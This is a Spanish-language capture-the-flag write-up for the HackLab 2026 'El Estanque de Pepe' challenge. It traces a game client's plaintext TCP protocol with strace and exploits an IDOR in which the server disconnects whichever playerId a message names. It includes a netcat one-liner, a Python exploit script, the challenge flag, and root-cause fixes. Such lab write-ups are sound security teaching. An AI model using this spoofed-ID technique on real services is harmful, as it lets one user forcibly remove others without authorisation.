# Desafío - El Estanque de Pepe (HackLab)

**Plataforma:** Software Seguro — HackLab  
**Edición:** HackLab 2026  
**Categoría:** IDOR (Insecure Direct Object Reference) sobre Socket TCP  
**Equipo:** GoT  
**Autor:** adonaissh  
**Flag:** `14e4612f863dee1f15708cd0a59f0487`  

---

## 📌 Enunciado

> Pepe creó un nuevo juego multijugador para disfrutar su pasión desde casa: la pesca.
>
> Pero hay un jugador que lo está atormentando: **`xX_gochi_Xx`**. Este jugador usa scripts para darse una puntuación imposiblemente grande y se la pasa mandando mensajes por el chat.
>
> Pepe te pide ayuda: necesita que encuentres una forma de echar a `xX_gochi_Xx` del lobby así puede jugar en paz.
>
> **Objetivo:** Echá a `xX_gochi_Xx` del lobby. Apenas el jugador queda fuera, el servidor despacha la flag en el chat del lobby.
>
> **Binarios provistos:** Ejecutables para Windows (`.exe`), Linux (`x86-64`) y macOS.

---

## 🔍 Análisis Inicial y Reconocimiento

Se descargó el cliente para Linux (`ElEstanqueDePepe-Linux`). Al no tratarse de una aplicación web tradicional, se investigó cómo se comunica el juego con el backend.

### 1. Inspección Dinámica con `strace`
Para interceptar llamadas al sistema, sockets y tráfico de red en crudo, se ejecutó el binario monitorizado con `strace`:

```bash
chmod +x ElEstanqueDePepe-Linux
strace -e trace=network,read,write -s 256 ./ElEstanqueDePepe-Linux
```

La salida de `strace` reveló inmediatamente toda la arquitectura de red:
- **Destino y Puerto:** Conexión TCP directa hacia el puerto `6767`:
  ```text
  connect(3, {sa_family=AF_INET, sin_port=htons(6767), sin_addr=inet_addr("72.61.35.6")}, ...)
  Host: pesca.shared.softwareseguro.com.ar:6767
  ```
- **Protocolo de texto plano:** El cliente y el servidor intercambian comandos delimitados por `;` y saltos de línea `\n`.
- **Negociación de Lobby:**
  1. El cliente envía `GET_LOBBY`.
  2. El servidor responde con el identificador del lobby asignado:
     ```text
     LOBBY:LBY-QAWLS4;
     ```
  3. El lobby es compartido entre todos los jugadores activos en la sala.

### 2. Estructura de Mensajes e Identificadores Directos
El protocolo implementa un formato rígido de mensaje:
$$\text{<LOBBY>:<playerId>:<ACCIÓN>:<PARÁMETROS>;}$$

Al conectarse y unirse con un nombre de jugador, el servidor devuelve la lista completa de participantes del lobby:
```text
LBY-QAWLS4:P83:JOIN:Jugador83:SCORE=0;       ← Sesión propia (playerId: P83)
LBY-QAWLS4:P37:JOIN:xX_gochi_Xx:SCORE=441;   ← Jugador objetivo (playerId: P37)
LBY-QAWLS4:P05:JOIN:matsam22:SCORE=105;
LBY-QAWLS4:P14:JOIN:Pepe67:SCORE=434;
```

---

## 🔬 Identificación de la Vulnerabilidad (IDOR sobre Socket TCP)

- **CWE-639: Insecure Direct Object Reference (IDOR):**  
  Aunque habitualmente se asocia a parámetros en URLs HTTP (`/api/user/123`), el concepto de IDOR aplica a cualquier protocolo donde **un identificador directo que representa a un actor o recurso viaja en el mensaje del cliente y el servidor actúa en función de dicho ID sin validar la identidad ni la propiedad de la sesión**.
  
El servidor cuenta con la acción `DISCONNECT` para desvincular a un jugador:
```text
<LOBBY>:<playerId>:DISCONNECT
```
**Falla:** El servidor confía ciegamente en el campo `<playerId>` provisto en la cadena enviada por el socket. En lugar de desconectar únicamente al cliente asociado al socket emisor, toma el `playerId` del texto y expulsa a ese usuario de la sala.

Dado que `xX_gochi_Xx` tiene asignado el identificador directo `P37`, cualquier conexión puede enviar un paquete de desconexión adjudicado a `P37`.

---

## 🚀 Cadena de Explotación

### Opción 1: Disparo Directo vía `netcat`
Conociendo el lobby actual (`LBY-QAWLS4`) y el `playerId` de la víctima (`P37`):

```bash
printf 'LBY-QAWLS4:P37:DISCONNECT\n' | nc pesca.shared.softwareseguro.com.ar 6767
```

**Respuesta devuelta por el servidor por el socket:**
```text
LBY-QAWLS4:P37:DISCONNECT;
LBY-QAWLS4:SERVER:FLAG:14e4612f863dee1f15708cd0a59f0487;
```

---

### Opción 2: Script Automatizado en Python
Dado que los lobbies pueden renovarse o cerrarse por inactividad, se diseñó un script en Python para negociar el lobby activo, resolver el `playerId` de `xX_gochi_Xx` dinámicamente y expulsarlo en una sola transacción:

```python
import socket
import time
import re

HOST = "pesca.shared.softwareseguro.com.ar"
PORT = 6767

s = socket.socket()
s.connect((HOST, PORT))
s.settimeout(3)

def send(m):
    s.sendall((m + "\n").encode())
    print(">>", m)

def recv():
    time.sleep(0.5)
    try:
        d = s.recv(4096).decode(errors="replace")
        print("<<", d.strip())
        return d
    except socket.timeout:
        return ""

# 1. Obtener lobby activo
send("GET_LOBBY")
lobby_raw = recv()
m = re.search(r'LOBBY:([^;\n]+)', lobby_raw)
lobby = m.group(1) if m else "LBY-QAWLS4"
print("[+] Lobby detectado:", lobby)

# 2. Unirse a la sala para listar jugadores
send(f"{lobby}:P83:JOIN:JugadorAdonai")
lista = recv()

# 3. Extraer el identificador directo de gochi
mg = re.search(r'([A-Z0-9-]+):(P\d+):JOIN:xX_gochi_Xx', lista)
gochi = mg.group(2) if mg else "P37"
print(f"[+] xX_gochi_Xx identificado como: {gochi}")

# 4. Explotación IDOR: Desconectar a gochi usando su propio ID
send(f"{lobby}:{gochi}:DISCONNECT")

print("[+] Esperando flag del servidor...")
for _ in range(6):
    resp = recv()
    if "FLAG:" in resp:
        flag = re.search(r'FLAG:([^;\n]+)', resp).group(1)
        print(f"\n[🏆] FLAG OBTENIDA: {flag}\n")
        break

s.close()
```

---

## 🏁 Flag

```text
14e4612f863dee1f15708cd0a59f0487
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Referencia directa a objetos sin control de acceso (CWE-639). La arquitectura delega el control de identidad al payload recibido a través del socket TCP en lugar de asociar la identidad del jugador al descriptor del socket/sesión de red en el servidor.
- **Recomendaciones:**
  - **Mapeo de Sesión en Backend:** El identificador del jugador (`playerId`) debe residir en el estado de la conexión en memoria del servidor (vinculado al socket del cliente). La acción `DISCONNECT` no debe admitir un parámetro de usuario arbitrario; el servidor debe desconectar exclusivamente al jugador dueño de ese socket.
  - **Autenticación y Tokens de Sesión:** Si se permite enviar acciones administrativas o de desconexión, requerir tokens de sesión criptográficos y roles de moderador/administrador de sala validados server-side.
